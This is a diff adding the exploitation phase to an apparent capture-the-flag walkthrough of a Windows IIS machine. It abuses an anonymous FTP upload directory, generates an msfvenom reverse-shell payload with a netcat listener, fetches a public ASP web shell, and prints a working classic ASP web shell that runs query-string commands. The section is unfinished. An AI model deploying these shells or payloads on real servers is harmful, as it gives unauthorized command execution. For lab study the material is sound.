@@ -134,4 +134,48 @@ Our enumeration reveals a ``/upload`` directory on the web server. We can visit 
 What’s interesting here is that the test file uploaded via FTB is actually located in this directory as we can see from the screenshot. This means that we have the ability to upload files to the web server and potentially acquire ourselves a command injection vector. This is the route we need to go if we are to exploit this target machine. The machine will on occasion clear the upload directory, so if attempting this machine and you cannot see this file then go back to the FTP anonymous and upload it again, it should appear. 
 
 ## Phase 2 – Exploitation
+Now we can finally enumerate the target to find our attack vector, we can proceed to exploiting the vulnerability to get user. The upload directory is of high interest but uploading and executing a shell isn't straight forward. In this phase we'll be using ASP web shells and a powershell shell script.
+
+### Web Command Execution
+Since we have a direct way to upload files to the web server directory and it allows us to execute them via /upload/[filename] it is logical to assume that our next course of action is to upload a shell so we can get a terminal connection to the target. The type of shell script we need depends on the backend software running, different web servers use different handlers for their server-side scripting, largely this is PHP however our nmap scan and the index page of the web service indicates this is a Microsoft IIS server.
+
+![img](assets/index_page.png)
+
+These servers usually use ASP or ASPX format for server-side processing, so initially we would probably craft ourselves an aspx shell using ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR IP] LPORT=[LISTENER PORT] -f aspx > shell.aspx``, I also did the same but with the ASP format. For now let’s assume a 64 bit architecture. I upload both my crafted shells with a ``nc -lnvp [port]`` running but when I visit the /upload/[shellname] URI’s I receive the following error.
+
+![img](assets/shell_fail_format.png)
+'
+The page is stating that the page cannot be loaded due to the filename extension. This is with all formats - except the ASP format which just shows a blank page. This means that the web server can execute asp files, however my listener does not catch a connection, the reverse TCP is being blocked.
+
+ASP files can still be used to execute server commands in the form of a web shell, unlike a reverse TCP which creates a connection between two hosts, a web shell will take a command input parameter and then execute it, thereby facilitating remote command execution. There is an asp web shell made by tennc on github that we can download and use from ``wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.asp`` and upload it to the FTP. 
+
+![img](assets/github_shell.png) 
+
+It will present for us a web page with an input field for our command and also display the user name and hostname.
+
+### OPTIONAL ALTERNATIVE: Active Server Page Scripting
+This machine provides a good opportunity to learn about ASP exploitation by allowing us to write our own ASP web shell script.
+
+ASP stands for Active Server Pages and is a framework for developing web pages using server-side execution. Released in 1998 ASP became Micrsoft’s first server-side scripting language, it originally used HTML pages with the .asp extension to integrate server-side scripts written in the into the web page content, scripts in ASP files use VBScript syntax. There have since been many different development models for ASP, since our target web server is using ASP files to serve web page content we are using the original model known as classic ASP. We can read how to use this at https://www.w3schools.com/asp/asp_introduction.asp, W3schools also has lots of references to different ASP objects and functions on the sidebar too. Using this as a reference we can construct the following script.
+
+```
+<%
+commandInput = Request.QueryString("cmd") ' Take our command to execute.
+set Shell = CreateObject("WScript.Shell") ' Shell object to execute the command with.
+set CommandExecution = Shell.Exec(commandInput).StdOut ' Execute the command and save the output stream object	.
+outputString = CommandExecution.Readall() ' Read the steam object as a string.
+response.write outputString ' Output the string that comes of our command execution.
+%>
+```
+
+ASP files are HTML files but can parse tags to reference scripts. Our script first needs to use the ASP script tags ``<%`` and ``%>``, we can also include HTML formatting however we just need to input command and output response so to save time there is no need for it to be included. We can specify the command to execute via the HTTP request query string, e.g ``wshell?cmd=[command]``. The request ASP object has a method for retrieving query string values so by using ``Request.QueryString(“cmd”)`` we can retrieve the command we wish to execute.  Using the Wscript root object that is always instantiated when a windows script is run, we create a new windows shell object by creating an instance from ``WScript.Shell``. To create an object in VBScript syntax we must use ``set``. We can now use ``Exec()`` method of our shell to execute the command. To know the output we use the ``StdOut`` property inherited from the WScript object to return a text stream object. With the ``ReadAll()`` method available for all text stream objects, we can parse the output steam as a string. Finally to read the command output we need to send it as the HTTP response, so ``Response.write OutputString`` will return the output from our shell executing the query string as the HTTP response.
+
+To test it we just upload the script to the FTP directory then when we request the asp file we include our command as the query string, I name it ‘wshell.asp’ so the URI of our request will be ``wshell.asp?cmd=whoami`` if we want to execute the ``whoami`` command.
+
+![img](assets/curl_URL.png) [todo]
+
+Now we can execute commands on the web server by either manually visiting the page or using curl like shown above. However this shell is highly limited and there are very few commands we are able to execute.
+To see more of how to use ASP with VBscript then see the examples at https://www.w3schools.com/asp/asp_examples.asp, VBScript is used in many Microsoft scripting situations, it allows Windows users to script powerful tools for managing their systems, therefore being able to interpret and understand it’s syntax can be beneficial when penetration testing windows target hosts: https://www.tutorialspoint.com/vbscript/index.htm
+
+### Interactive Command Shell
 COMING SOON!
